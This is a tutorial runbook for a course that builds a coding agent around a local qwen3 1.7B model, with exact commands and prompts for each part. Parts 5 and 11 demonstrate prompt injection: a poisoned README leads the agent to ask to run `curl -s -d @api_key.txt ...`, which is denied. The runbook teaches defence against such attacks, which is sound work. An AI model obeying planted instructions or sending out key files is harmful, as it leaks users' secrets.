# Runbook: the course with qwen3 1.7B

Every step below was replayed against `cc-qwen3` and produces the same transcript every time on this
machine. Type the prompts exactly as written: one changed character is a different prompt, and a
1.7B model can take a different path from it. Each part also has a `break_it.py`, which runs on the
scripted model and shows the failure that part fixes; run it first.

```bash
cd claude_code_from_scratch
source .venv/bin/activate
ollama create cc-qwen3 -f Modelfile      # once, and again whenever the Modelfile changes
unset MODEL                              # the default is cc-qwen3; MODEL=fake for the scripted model
```

At a permission prompt, **1** is yes, **2** is no (or "don't ask again" when that option is shown,
then **3** is no). Esc also says no. Each model step shows qwen thinking in grey for a few seconds.

## Part 0 · The screen and the function
1. `python part_0/main.py`, type anything. A puppet: no model at all.
2. `python part_0/one_call.py`: forgets your name, then remembers it once the history is sent.
3. `python part_0/tool_call.py`: qwen asks for `Read(cart.py)` and stops. Nothing ran it.

## Part 1 · The loop
`python part_1/main.py --reset`, type **fix the failing test**, press **1** three times.
qwen runs `pytest` (not found), tries `pip` twice (disabled), then reads a `test.py` that doesn't
exist and the turn dies with `Error: [Errno 2] No such file or directory`. About 40 s.
That error is Part 2's opening.

## Part 2 · Tool design
`python part_2/main.py --reset`, type **what's in config.py?**
The Read fails, the error comes back as a result, qwen searches with Glob and says the file doesn't
exist. Then **ok, try settings.py**: same recovery. No prompts to answer.

## Part 3 · Streaming
`python part_3/main.py --reset`, type **Explain the bug in the total function in cart.py.**
It reads cart.py and streams the right answer: the discount is subtracted as money, not a percentage.

## Part 4 · Interruptions
1. `python part_4/main.py --reset`, type **Run \`sleep 8 && echo done\`.**, press **1**, then **Esc**
   while it runs. Type **are you still there?** and it answers normally: no 400.
2. `/clear`, type **fix the failing test**, and straight away, while it works, type
   **The bug is in cart.py, not in the test.** and press Enter. It reads cart.py and asks to edit it:
   press **1**. The fix is right and the tests pass.

## Part 5 · Permissions
1. `python part_5/main.py --inject`, type **Read README.md and set up the project the way it says.**
   It reads the poisoned README and asks to run `git status && curl -s -d @api_key.txt ...`.
   Press **2** (no). It then asks to write a `setup.py`: press **1**.
2. `python part_5/main.py --reset`, press **shift+tab twice** for plan mode, type
   **Read cart.py and test_cart.py, then plan a fix for the failing test. Don't change anything.**
   It reads both and explains the fix. No prompts: plan mode only allows reading.

## Part 6 · Persistence
1. `python part_6/main.py --reset`, type
   **Deploy by running \`echo started >> deploy.log && sleep 5 && echo finished >> deploy.log\`. It takes five seconds; don't use run_in_background.**
   Press **1**. While it runs, in a second terminal: `pkill -9 -f part_6/main.py`.
2. `python part_6/main.py --resume` (no `--reset`). It says one tool call has no recorded outcome.
   Type **Did the deploy finish? Check deploy.log.** It reads the log and says it finished: the
   agent died, the command didn't.

## Part 7 · Context
`python part_7/main.py --reset`, type **fix the failing test**, press **1** at both prompts.
With AGENTS.md in its system prompt it runs `python3 test_cart.py` first. It tries to change the test,
and the deny rule in `.agent/settings.json` refuses, twice. It ends by explaining the right fix,
`(1 - discount/100)`, without making it. About 2.5 minutes. `/context` shows where the tokens went.

## Part 8 · The stop hook
`python part_8/main.py --reset --until "python3 test_cart.py"`, type **fix the failing test**, press
**1** at every prompt. The same start as Part 7; when it stops, the hook runs the tests and sends it
back. It edits cart.py with the right fix and the tests pass. About 4 minutes.
Then the Ralph loop, on the scripted model so it takes 25 seconds:
`MODEL=fake python part_8/ralph.py --reset`. Three passes, one feature each, a commit after each; it
ends by printing `PROGRESS.md`, which the loop wrote from the tests. `git -C sandbox_ralph log --oneline`
shows the commits. On qwen each pass takes minutes, so keep that run off camera.

## Part 9 · Reliability
`FAULTS=529,529 python part_9/main.py --reset --until "python3 test_cart.py"`, type
**fix the failing test**, press **1** at every prompt. Two `API error 529` lines and two retries,
then exactly Part 8's run, to the same fix.

## Part 10 · Subagents
`python part_10/main.py --reset`
1. Type **explore the project**: four Reads in one step, run together.
2. `/clear`, type **Use three subagents at once: one explains cart.py, one explains test_cart.py, one summarises AGENTS.md. Then combine their answers.**
   Three subagents run at the same time; each result says how many tokens it used on its own.

## Part 11 · Always-on agents
On the scripted model, so each run takes seconds. Start with `export MODEL=fake`.
1. `python part_11/always_on.py --once --reset "fix the failing test"`. Nobody is watching and nothing
   is allowed, so every Bash call is refused and the run ends `needs you`. It never waits.
2. Run it again with what it may do, written before you leave:
   `python part_11/always_on.py --once --reset "fix the failing test" --allow "Bash(python3 test_cart.py)" --allow "Edit(cart.py)" --until "python3 test_cart.py"`.
   It ends `done`; `cat sandbox/.agent/runs/*.md` shows the report.
3. A trigger with a poisoned README: `cp -r part_5/inject/. sandbox/ && mkdir -p sandbox/inbox && echo "set up the project" > sandbox/inbox/setup.txt`, then
   `python part_11/always_on.py --watch sandbox/inbox --runs 1 --allow "Bash(python3 test_cart.py)" --allow "Edit(cart.py)"`.
   The curl is denied, the run ends `needs you`, and `setup.txt` moves to `inbox/done/`.
4. Show the crontab line from the README on screen; don't install it on the recording machine.
On qwen a run takes minutes, so keep qwen runs off camera here too.

## Why it replays

- `Modelfile`: temperature 0, top_k 1, seed 42, a 16k window.
- `local.py`: qwen thinks for at most 256 tokens a step (`THINK_BUDGET` changes it), and Ollama's
  prompt cache is emptied at the start of every session, so nothing from an earlier run leaks in.
- The agent's commands get a fixed PATH: the course's Python as `python3`, no `pip`, nothing from
  your shell. No date or git status in the system prompt.

Change any prompt, file in `workspace/`, tool description or system prompt, and the runs above can
change. Rehearse after every change.
